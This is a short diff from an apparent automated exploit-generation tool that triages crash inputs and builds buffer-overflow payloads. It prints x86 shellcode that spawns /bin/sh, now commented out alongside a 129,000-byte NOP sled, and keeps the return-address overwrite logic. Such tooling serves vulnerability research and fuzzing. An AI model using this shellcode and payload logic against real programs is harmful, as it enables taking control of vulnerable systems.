@@ -115,7 +115,7 @@ def root_cause_analysis(crash_input: bytes, arg_config: argparse.Namespace):
     if eip in crash_input:    
         return True
 
-    #eip still has a valid value, so it wasn't overwritten by the payload. The program prematurel ycrashed and it did not reach the return address
+    #eip still has a valid value, so it wasn't overwritten by the payload. The program prematurely crashed and it did not reach the return address
     else:
         return False
 
@@ -142,11 +142,11 @@ def payload_builder(crash_input: bytes, target_bin: str):
     """
 
     target_address = stack_middle_address(target_ra(target_bin))
-    shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
+    # shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
 
     payload = overwrite_ra(crash_input, target_bin, struct.pack("<I", target_address))
-    payload += b'\x90' * 129000
-    payload += shellcode
+    # payload += b'\x90' * 129000
+    # payload += shellcode
 
     open("payload", "wb").write(payload)
 
